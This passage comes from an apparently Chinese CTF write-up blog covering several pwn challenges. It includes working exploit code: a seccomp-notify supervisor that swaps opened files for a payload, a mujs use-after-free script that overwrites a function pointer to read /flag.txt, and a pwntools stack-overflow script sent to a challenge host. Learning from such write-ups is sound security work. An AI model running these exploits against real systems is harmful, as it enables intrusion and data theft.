<span class="hljs-keyword">void</span> <span class="hljs-title">allocSeccompNotifBuffers</span><span class="hljs-params">(struct seccomp_notif **req,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     struct seccomp_notif_resp **resp,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     struct seccomp_notif_sizes *sizes)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span> (seccomp(SECCOMP_GET_NOTIF_SIZES, <span class="hljs-number">0</span>, sizes) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;seccomp-SECCOMP_GET_NOTIF_SIZES&quot;</span>);<br><br>  *req = <span class="hljs-built_in">malloc</span>(sizes-&gt;seccomp_notif);<br>  <span class="hljs-keyword">if</span> (*req == <span class="hljs-literal">NULL</span>)<br>    errExit(<span class="hljs-string">&quot;malloc-seccomp_notif&quot;</span>);<br><br>  <span class="hljs-keyword">size_t</span> resp_size = sizes-&gt;seccomp_notif_resp;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">sizeof</span>(struct seccomp_notif_resp) &gt; resp_size)<br>    resp_size = <span class="hljs-keyword">sizeof</span>(struct seccomp_notif_resp);<br><br>  *resp = <span class="hljs-built_in">malloc</span>(resp_size);<br>  <span class="hljs-keyword">if</span> (resp == <span class="hljs-literal">NULL</span>)<br>    errExit(<span class="hljs-string">&quot;malloc-seccomp_notif_resp&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handleNotifications</span><span class="hljs-params">(<span class="hljs-keyword">int</span> notifyFd)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif_sizes</span> <span class="hljs-title">sizes</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif</span> *<span class="hljs-title">req</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif_resp</span> *<span class="hljs-title">resp</span>;</span><br>  <span class="hljs-keyword">char</span> path[PATH_MAX];<br><br>  allocSeccompNotifBuffers(&amp;req, &amp;resp, &amp;sizes);<br><br>  <span class="hljs-comment">/* Loop handling notifications */</span><br><br>  <span class="hljs-keyword">for</span> (;;)<br>  &#123;<br>    <span class="hljs-comment">/* Wait for next notification, returning info in &#x27;*req&#x27; */</span><br><br>    <span class="hljs-built_in">memset</span>(req, <span class="hljs-number">0</span>, sizes.seccomp_notif);<br>    <span class="hljs-keyword">if</span> (ioctl(notifyFd, SECCOMP_IOCTL_NOTIF_RECV, req) == <span class="hljs-number">-1</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (errno == EINTR)<br>        <span class="hljs-keyword">continue</span>;<br>      errExit(<span class="hljs-string">&quot;\tS: ioctl-SECCOMP_IOCTL_NOTIF_RECV&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (req-&gt;data.nr != __NR_openat)<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<br>          <span class="hljs-string">&quot;\tS: notification contained unexpected &quot;</span><br>          <span class="hljs-string">&quot;system call number; bye!!!\n&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif_addfd</span> <span class="hljs-title">addfd</span>;</span><br>    addfd.id = req-&gt;id; <span class="hljs-comment">/* Cookie from SECCOMP_IOCTL_NOTIF_RECV */</span><br>    addfd.srcfd = openat(req-&gt;data.args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;/tmp/payload&quot;</span>, req-&gt;data.args[<span class="hljs-number">2</span>], req-&gt;data.args[<span class="hljs-number">3</span>]);<br>    addfd.newfd = <span class="hljs-number">3</span>;<br>    addfd.flags = SECCOMP_ADDFD_FLAG_SETFD;<br>    addfd.newfd_flags = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> a2 = ioctl(notifyFd, SECCOMP_IOCTL_NOTIF_ADDFD, &amp;addfd);<br><br>    resp-&gt;id = req-&gt;id;<br>    resp-&gt;flags = <span class="hljs-number">0</span>;<br>    resp-&gt;val = <span class="hljs-number">0</span>;<br>    resp-&gt;error = resp-&gt;val = <span class="hljs-number">0</span>;<br>    resp-&gt;val = a2;<br><br>    resp-&gt;flags = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (ioctl(notifyFd, SECCOMP_IOCTL_NOTIF_SEND, resp) == <span class="hljs-number">-1</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (errno == ENOENT)<br>        <span class="hljs-built_in">printf</span>(<br>            <span class="hljs-string">&quot;\tS: response failed with ENOENT; &quot;</span><br>            <span class="hljs-string">&quot;perhaps target process&#x27;s syscall was &quot;</span><br>            <span class="hljs-string">&quot;interrupted by a signal?\n&quot;</span>);<br>      <span class="hljs-keyword">else</span><br>        perror(<span class="hljs-string">&quot;ioctl-SECCOMP_IOCTL_NOTIF_SEND&quot;</span>);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-built_in">free</span>(req);<br>  <span class="hljs-built_in">free</span>(resp);<br>  <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-comment">/* Implementation of the supervisor process:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  (1) obtains the notification file descriptor from &#x27;sockPair[1]&#x27;</span><br><span class="hljs-comment">  (2) handles notifications that arrive on that file descriptor. */</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">supervisor</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sockPair[<span class="hljs-number">2</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> notifyFd = recvfd(sockPair[<span class="hljs-number">1</span>]);<br>  <span class="hljs-keyword">if</span> (notifyFd == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;recvfd&quot;</span>);<br><br>  closeSocketPair(sockPair); <span class="hljs-comment">/* We no longer need the socket pair */</span><br><br>  handleNotifications(notifyFd);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">readBinary</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> sz, readed;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size:&quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;sz);<br>  <span class="hljs-keyword">char</span> *buf = <span class="hljs-built_in">malloc</span>(sz);<br><br>  <span class="hljs-keyword">int</span> f = open(<span class="hljs-string">&quot;/tmp/payload&quot;</span>, O_WRONLY | O_CREAT, <span class="hljs-number">0777</span>);<br>  <span class="hljs-keyword">while</span> (sz &gt; <span class="hljs-number">0</span>)<br>  &#123;<br>    readed = read(<span class="hljs-number">0</span>, buf, sz);<br>    write(f, buf, readed);<br>    sz -= readed;<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> sockPair[<span class="hljs-number">2</span>];<br><br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>  readBinary();<br>  <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sockPair) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;socketpair&quot;</span>);<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">sa</span>;</span><br>  sa.sa_handler = sigchldHandler;<br>  sa.sa_flags = <span class="hljs-number">0</span>;<br>  sigemptyset(&amp;sa.sa_mask);<br><br>  <span class="hljs-keyword">if</span> (sigaction(SIGCHLD, &amp;sa, <span class="hljs-literal">NULL</span>) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;sigaction&quot;</span>);<br>  targetProcess(sockPair, &amp;argv[optind]);<br><br>  supervisor(sockPair);<br><br>  <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<h4 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// #include &lt;unistd.h&gt;</span><br><span class="hljs-comment">// #include &lt;asm/unistd.h&gt;</span><br><br><span class="hljs-comment">// __asm__(&quot;.symver __libc_start_main_impl,__libc_start_main@GLIBC_2.34&quot;);</span><br><span class="hljs-comment">// __asm__(&quot;.symver __libc_start_main_impl,__libc_start_main@GLIBC_3.2.5&quot;);</span><br><span class="hljs-comment">// __asm__(&quot;.symver puts_impl,puts@GLIBC_2.2.5&quot;);</span><br><span class="hljs-comment">// __asm__(&quot;.symver puts_impl,puts@GLIBC_2.34&quot;);</span><br><br><br><span class="hljs-keyword">void</span> __libc_start_main()&#123;<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;.intel_syntax noprefix&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rax,1&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rsi,rdi&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rdi,1&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rdx,0x1000&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;syscall&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// void puts_impl()&#123;</span><br><span class="hljs-comment">//     asm(&quot;.intel_syntax noprefix&quot;);</span><br><span class="hljs-comment">//     asm(&quot;mov rax,1&quot;);</span><br><span class="hljs-comment">//     asm(&quot;mov qword ptr [rax],1&quot;);</span><br><span class="hljs-comment">// &#125;</span><br></code></pre></div></td></tr></table></figure>

<h4 id="map"><a href="#map" class="headerlink" title="map:"></a>map:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">GLIBC_2<span class="hljs-number">.34</span> &#123;<br>        global: __libc_start_main;<span class="hljs-built_in">puts</span>;<br>        local:  *;      # Hide all other symbols<br>&#125;;<br>GLIBC_2<span class="hljs-number">.2</span><span class="hljs-number">.5</span> &#123;<br>        global: __libc_start_main;<br>        local:  *;      # Hide all other symbols<br>&#125;;<br></code></pre></div></td></tr></table></figure>

<h3 id="solution-3"><a href="#solution-3" class="headerlink" title="solution 3 - ?"></a>solution 3 - ?</h3><blockquote>
<p>team solution</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>        prctl(PR_SET_NO_NEW_PRIVS, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        execlp(<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;LD_DEBUG=all sudo&quot;</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>然后呢? 没看懂</p>
<p>呃呃感觉是上一种方法的一个步骤, </p>
<ul>
<li>LD_DEBUG能打印出ld在加载共享库时的信息, 包括符号信息. </li>
<li>PR_SET_NO_NEW_PRIVS让之后的exec执行的新程序无法通过简单的setgid或者修改文件权限获得新的权限. </li>
</ul>
<p>这里是解法来源<a target="_blank" rel="noopener" href="https://clubby789.me/zer0pts2022/#readflag">link</a> </p>
<h2 id="jsy"><a href="#jsy" class="headerlink" title="jsy"></a>jsy</h2><p>最短的一个exp, 最长的有几千行不知道在写啥. 最短的也不知道在写啥. </p>
<p>发现了文档, 原来是一个js解释器, 是一个现成的项目. 那个patch是真是存在的一个漏洞吗? 这代码量也太大了….js也不怎么会…</p>
<blockquote>
<p>patch里加的free可以double free，2.35的glibc，可以通过占位控制某个header实现任意地址读写</p>
<p>没有Buffer，可以用Array，header大小应该是0x90</p>
<p>Array被free时，貌似只有header被free了，body不会被free</p>
</blockquote>
<h3 id="zanderdk的解释"><a href="#zanderdk的解释" class="headerlink" title="@zanderdk的解释:"></a>@zanderdk的解释:</h3><p>Short explanation: We use quite to create a object of type JS_CCFUNCTION which will have c union type bellow:</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">js_Object</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">char</span> noTcacheOverwrite[<span class="hljs-number">0x18</span>]; <br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">js_Class</span> <span class="hljs-title">type</span>;</span><br>    <span class="hljs-keyword">int</span> extensible;<br>    js_Property *properties;<br>    <span class="hljs-keyword">int</span> count; <span class="hljs-comment">/* number of properties, for array sparseness check */</span><br>    js_Object *prototype;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>....<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name;<br>            js_CFunction function;<br>            js_CFunction constructor;<br>            <span class="hljs-keyword">int</span> length;<br>            <span class="hljs-keyword">void</span> *data; <br>            js_Finalize finalize;<br>        &#125; c;<br></code></pre></div></td></tr></table></figure>

<p><code>js_CFunction function;</code> is a function pointer. We then free this object (target in hax.js) but keep a refrence to this object and we allocate it back using: </p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">S_fromCharCode</span><span class="hljs-params">(js_State *J)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i, top = js_gettop(J);<br>    <span class="hljs-keyword">char</span> * <span class="hljs-keyword">volatile</span> s = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">char</span> *p;<br>    Rune c;<br>    <span class="hljs-keyword">if</span> (js_try(J)) &#123;<br>        js_free(J, s);<br>        js_throw(J);<br>    &#125;<br>    s = p = js_malloc(J, (top<span class="hljs-number">-1</span>) * UTFmax + <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; top; ++i) &#123;<br>        c = js_touint32(J, i);<br>        p += runetochar(p, &amp;c);<br>    &#125;<br>    *p = <span class="hljs-number">0</span>;<br>    js_pushstring(J, s);<br>    js_endtry(J);<br>    js_free(J, s);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>then we partialy overwrite the function pointer with the addres of static void jsB_read(js_State *J) which will put the content of a file into a JS string.  The problem here is the <code>*p = 0;</code>  in the C above, as it will insert null terminator in the address. Sooo we just run it enough times for ALSR to pick a address with 0 at that position in the address. also runetochar do some utf8 magic to some of the bytes we put in if outside of ascii range. so prop a bit more than 255 actually. </p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">JS_CCFUNCTION = <span class="hljs-number">4</span> <span class="hljs-comment">/* built-in function */</span><br><span class="hljs-keyword">var</span> a = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; i++) &#123;<br>    a += <span class="hljs-string">&quot;\x08&quot;</span>;<br>&#125;<br><span class="hljs-keyword">var</span> thingy = &#123;&#125;;<br><span class="hljs-keyword">var</span> dummy1 = &#123;&#125;;<br><span class="hljs-keyword">var</span> dummy2 = &#123;&#125;;<br><span class="hljs-keyword">var</span> dummy3 = &#123;&#125;;<br><span class="hljs-keyword">var</span> dummy4 = &#123;&#125;;<br><span class="hljs-keyword">var</span> target = quit;<br><span class="hljs-keyword">var</span> over = <span class="hljs-string">&quot;A&quot;</span>;<br>free(target);<br>free(thingy);<br>a.toLowerCase();<br><br><span class="hljs-keyword">var</span> a = ((target.length) &amp; <span class="hljs-number">0xffffff</span>) - <span class="hljs-number">0x2c2</span>;<br>print(a);<br><br>lol = <span class="hljs-built_in">String</span>.fromCharCode(<br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x010000</span>,<br>    JS_CCFUNCTION, <span class="hljs-comment">/* +0x18 */</span><br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x010000</span>,      <span class="hljs-comment">/* +0x1c : extensible */</span><br>    <span class="hljs-number">0x010000</span>,      <span class="hljs-comment">/* properties */</span><br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x010000</span>,      <span class="hljs-comment">/* count  */</span><br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x0800</span>,      <span class="hljs-comment">/* prototype  */</span><br>    <span class="hljs-number">0x43</span>,      <span class="hljs-comment">/*  */</span><br>    <span class="hljs-number">0x43</span>,      <span class="hljs-comment">/*  */</span><br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-comment">// partial overwrite start here</span><br>    a &amp; <span class="hljs-number">0xff</span>,<br>    (a &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>,<br>    (a &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span><br>)<br><br>print(target(<span class="hljs-string">&quot;/flag.txt&quot;</span>));<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>);<br>-- EOF --<br></code></pre></div></td></tr></table></figure>

<h2 id="Escape-maze"><a href="#Escape-maze" class="headerlink" title="Escape maze"></a>Escape maze</h2><p>还没看过. </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>conn=remote(<span class="hljs-string">&quot;65.21.255.31&quot;</span>,<span class="hljs-number">34979</span>)<br>r=<span class="hljs-string">b&#x27;0&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    u=conn.recvuntil(<span class="hljs-string">b&#x27;key number:&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(u)<br>    nr=u.split(<span class="hljs-string">b&#x27;\n&#x27;</span>)[-<span class="hljs-number">2</span>].split(<span class="hljs-string">b&#x27; &#x27;</span>)[-<span class="hljs-number">8</span>].replace(<span class="hljs-string">b&#x27;,&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> nr!=r:<br>        conn.sendline(nr)<br>        r=nr<br>    <span class="hljs-keyword">else</span>:<br>        conn.sendline(u.split(<span class="hljs-string">b&#x27;\n&#x27;</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">b&#x27; &#x27;</span>)[-<span class="hljs-number">1</span>])<br></code></pre></div></td></tr></table></figure>

<h1 id="ASIS-CTF-2022-FINA"><a href="#ASIS-CTF-2022-FINA" class="headerlink" title="ASIS CTF 2022 FINA"></a>ASIS CTF 2022 FINA</h1><h2 id="readable-v2"><a href="#readable-v2" class="headerlink" title="readable-v2"></a>readable-v2</h2><p>…</p>
<h1 id="CSR-2022"><a href="#CSR-2022" class="headerlink" title="CSR 2022"></a>CSR 2022</h1><h2 id="PWNMEPLX"><a href="#PWNMEPLX" class="headerlink" title="PWNMEPLX"></a>PWNMEPLX</h2><blockquote>
<p>CSR 2022</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">┌──(root💀kali)-[/mnt/LearingList/CTF/PWNMEPLX]<br>└─# checksec pwn             <br>[*] &#x27;/mnt/LearingList/CTF/PWNMEPLX/pwn&#x27;<br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br></code></pre></div></td></tr></table></figure>

<p>这个是取绝对值的x64汇编写法: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">.text:0000000000401336 8B 45 8C                                   mov     eax, [rbp+var_74]<br>.text:0000000000401339 99                                         cdq<br>.text:000000000040133A 89 D0                                      mov     eax, edx<br>.text:000000000040133C 33 45 8C                                   xor     eax, [rbp+var_74]<br>.text:000000000040133F 29 D0                                      sub     eax, edx<br>.text:0000000000401341 C9                                         leave<br>.text:0000000000401342 C3                                         retn<br></code></pre></div></td></tr></table></figure>

<p>简单的栈溢出覆盖返回地址居然因为&lt;__vfscanf_internal+133&gt;处的xmmword需要0x10字节对齐而出错…….</p>
<p>简单的不想多说. 但是还是做了好一会儿, 还在想是不是符号/浮点数的问题, 结果就是一个简单的后门栈溢出.</p>
<p>这个比赛的pwn题全都是签到, 差点意思. </p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">from pwn <span class="hljs-keyword">import</span> *<br>context.binary = <span class="hljs-string">&#x27;./pwn.elf64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=lambda x:p.send(x)       <span class="hljs-meta">#send string</span><br>sl=lambda x:p.sendline(x)<br>ru=lambda x:p.recvuntil(x)<br>rl=lambda :p.recvline()<br>ra=lambda :p.recv()         <span class="hljs-meta">#recv one</span><br>rn=lambda x:p.recv(x)       <span class="hljs-meta">#recv n</span><br>sla=lambda x,y:p.sendlineafter(x,y)<br>itt=lambda :p.interactive()<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&quot;chall.rumble.host&quot;</span>, <span class="hljs-number">5415</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./pwn.elf64&quot;</span>)<br><br>payload = b<span class="hljs-number">&#x27;b</span><span class="hljs-number">&#x27;</span>*(<span class="hljs-number">112</span>+<span class="hljs-number">8</span>) + pack(<span class="hljs-number">0x401348</span>, <span class="hljs-number">64</span>)<br>sl(b<span class="hljs-string">&quot;-1&quot;</span>)<br>sl(payload)<br>itt()<br></code></pre></div></td></tr></table></figure>

<h2 id="PWNFORTRESS"><a href="#PWNFORTRESS" class="headerlink" title="PWNFORTRESS"></a>PWNFORTRESS</h2><blockquote>
<p>同上, 不过题目是rev+game. 基本不会</p>
</blockquote>
<p>主要问题是明确了glibc版本, 但是ubuntu的2.3几之后的全都是用.zst压缩, dpkg无法解压, 改成了清华源中debian的glibc库, 然后dbg版本的包里面也没有带符号的库文件. 不知道怎么用了, 分析了半天glibc-all-in-one代码不知道怎么改, 索性就没有符号吧. 不过在ubuntu2022里直接运行. </p>
<p>debian glibc file <a target="_blank" rel="noopener" href="https://packages.debian.org/source/bookworm/glibc">catagory</a> | <a target="_blank" rel="noopener" href="https://mirror.tuna.tsinghua.edu.cn/debian/pool/main/g/glibc/">tuna</a> mirror site</p>
<p>不会做. </p>
<p>unintended solution:</p>
<p>breakpoint before the level is printed, make it print the last level instead, it will segfault, but the decoded map is in memory</p>
<hr>
<p>随便看到一题都有三个标签, cry, misc, pwn, 没接触过的加密和杂项, 属实不会, 还有一些虚拟机逃逸加上什么RISC-JIT之类没听说过的技术. 到处都是知识盲区.</p>
<h1 id="Hackergame-2022"><a href="#Hackergame-2022" class="headerlink" title="Hackergame 2022"></a>Hackergame 2022</h1><p>简单题略过了, 不太想花时间. 能做的学不到东西, 能学到的基本不会做. </p>
